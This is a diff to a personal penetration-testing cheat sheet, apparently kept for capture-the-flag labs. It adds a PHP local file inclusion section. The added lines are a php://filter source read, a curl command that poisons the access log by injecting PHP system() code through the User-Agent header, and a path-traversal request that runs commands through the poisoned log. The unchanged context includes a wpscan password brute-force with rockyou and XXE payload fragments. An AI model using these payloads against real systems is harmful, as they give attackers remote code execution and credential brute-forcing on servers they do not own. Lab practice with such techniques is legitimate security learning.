@@ -82,14 +82,18 @@ wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
   <com>&xxe;</com>
 </comment>
 ```
+#### php local file inclusion
+```
+http://10.10.62.183/?view=php://filter/read=convert.base64-encode/resource=dog/../index
+curl "http://10.10.62.183/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
+http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='command'
+```
 ---
 ###  Encoding techniques:
 - [splitbrain](https://www.splitbrain.org/_static/ook/)
 - [hashes](https://hashes.com/en/tools/hash_identifier)
 - [md5hashing](https://md5hashing.net/hash)
 - [cyberchef](https://gchq.github.io/CyberChef/)
-
-
 ---
 ### Privilege Escalation:
 #### LXD container exploitation:
